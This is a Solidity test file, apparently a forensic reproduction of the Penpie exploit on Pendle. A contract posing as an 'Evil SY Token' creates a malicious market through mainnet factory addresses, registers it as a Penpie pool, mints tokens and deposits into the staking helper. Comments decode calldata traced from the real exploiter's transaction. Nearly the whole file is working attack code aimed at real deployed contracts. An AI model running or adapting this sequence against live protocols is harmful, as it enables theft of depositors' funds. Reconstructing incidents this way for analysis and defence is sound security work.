// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Cheatsheet.sol";

import "../src/interfaces/pendle/PendleYieldContractFactory.sol";
import "../src/interfaces/pendle/PendleYieldToken.sol";
import "../src/interfaces/pendle/PendleRouterV4.sol";
import "../src/interfaces/pendle/PendleMarketV3.sol";
import "../src/interfaces/pendle/PendleMarketRegisterHelper.sol";
import "../src/interfaces/pendle/PendleMarketDepositHelper.sol";
import "../src/interfaces/pendle/PendleStaking.sol";
import "../src/interfaces/pendle/PendleMarketFactoryV3.sol";


contract AttackingContract is Test {
    string public name = 'Evil SY Token'; // These params don't really matter
    string public symbol = 'EVIL';
    uint8 public immutable decimals = 18;

    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[to] += amount;
    }

    function _mint(address to, uint256 amount) internal virtual {
        balanceOf[to] += amount;
    }


    function createEvilPendleMarket() external {
        // Exploiter creates a Principal Token and a Yield Token on Pendle
        // using his evil Standard Yield token.
        (address PT, address YT) = PendleYieldContractFactory(0x35A338522a435D46f77Be32C70E215B813D0e3aC)
            .createYieldContract(
                address(this), // this evil Standard Yield token
                1735171200,
                true
            );

        // Exploiter
        // 0x7A2f4D625Fb21F5e51562cE8Dc2E722e12A61d1B (Penpie exploiter)
        // sends tx
        // 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1
        // to
        // 0x4476b6ca46B28182944ED750e74e2Bb1752f87AE (evil SY Token)
        // generates an internal tx to
        // 0x6fcf753f2c67b83f7b09746bbc4fa0047b35d050 (PendleMarketFactoryV3)
        // creates
        // 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82 (evil Market)
        //
        // Etherscan doesn't provide a way to know
        // which were the sent params to 0x4476b6ca46B28182944ED750e74e2Bb1752f87AE
        // that ended up internally calling PendleMarketFactoryV3.createNewMarket(...)
        // because the contract is NOT verified.
        //
        // After debugging the internal calls we find the calldata for
        // the CREATE2 opcode that creates 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82
        // f6 61 cf 6b 00 00 00 00 00 00 00 00 00 00 00 00 e0 24 a1 82 06 76 7e 29 98 4a 46 89 24 e2 d3 18
        // 33 4C 98 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 44 13 b0 49
        // 22 41 ea 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0e 54 1b a6
        // 09 5d a4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 19 2c
        // 3e ed c5 80
        //
        // 0xf661cf6b turns out to be the function selector for createNewMarket()
        // and it makes sense because 0xe024a18206767e29984a468924e2d318334C9830
        // turns out to be the address of the Principal Token generated in the previous call
        // the rest of the params just need to be decoded as int256, int256 and uint80 respectively
        address LPT = PendleMarketFactoryV3(0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050)
            .createNewMarket(
                PT,
                23352202321000000000,
                1032480618000000000,
                1998002662000000
            );

        // Then the evil SY token makes a call to 0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a
        // which is verified as PendleMarketRegisterHelper
        // with the calldata 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82
        // which is our evil Pendle Market (also a Liquidity Provider Token)
        PendleMarketRegisterHelper(0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a).registerPenpiePool(LPT);

        // We have a call to this contract's _mint() method with params:
        // 0x0e3792cba36eef3a20aee3a251d24d7f42491483 (Yield Token)
        // 0x0de0b6b3a7640000 = 1e18
        _mint(address(YT), 1 ether);

        // Then, a call to 0x0e3792cba36eef3a20aee3a251d24d7f42491483 (Yield Token)
        // with calltada:
        // db 74 aa 15 00 00 00 00 00 00 00 00 00 00 00 00 44 76 b6 ca 46 b2 81 82 94 4e d7 50 e7 4e 2b b1
        // 75 2f 87 ae 00 00 00 00 00 00 00 00 00 00 00 00 44 76 b6 ca 46 b2 81 82 94 4e d7 50 e7 4e 2b b1
        // 75 2f 87 ae
        // Which is this evil contract's address as both params of mintPY() (0xdb74aa15)
        PendleYieldToken(YT).mintPY(address(this), address(this));

        // Call to 0xe024a18206767e29984a468924e2d318334C9830 (Principal Token)
        // balanceOf() method, with a single param in calldata:
        // 0x4476b6ca46B28182944ED750e74e2Bb1752f87AE (this evil SY Token)
        uint256 thisContractsBalance = IERC20(PT).balanceOf(address(this));
        // Call to PT's transfer() (0xa9059cbb) method
        // Transfer this contracts Principal Token balance into the evil Market
        IERC20(PT).transfer(LPT, thisContractsBalance);

        // Mints 1 evil Standard Yield token to the evil Market
        _mint(address(LPT), 1 ether);

        // Call to 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82 (evil Market / LPT)
        // 0x156e29f6 is the selector for it's mint() method
        // Mints 1 evil Market's LPT for this evil SY Token contract
        PendleMarketV3(LPT).mint(
            address(this),
            1 ether,
            1 ether
        );

        // Call to 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82 (evil Market / LPT) with calldata:
        // 09 5e a7 b3 00 00 00 00 00 00 00 00 00 00 00 00 6e 79 97 58 ce e7 5d ae 3d 84 e0 9d 40 dc 41 6e
        // cf 71 36 52 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
        // ff ff ff ff
        // Which decode to:
        // approve() (0x095ea7b3)
        // 0x6E799758CEE75DAe3d84e09D40dc416eCf713652
        // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = 2**256 - 1 = uint256.max
        IERC20(LPT).approve(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, type(uint256).max);

        // 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82 (evil Market / LPT)
        // 0x0de0b6b3a763fc18 = 0x0de0b6b3a7640000 - 1000 = 999999999999999000
        PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).depositMarket(LPT, 999999999999999000);
    }
}
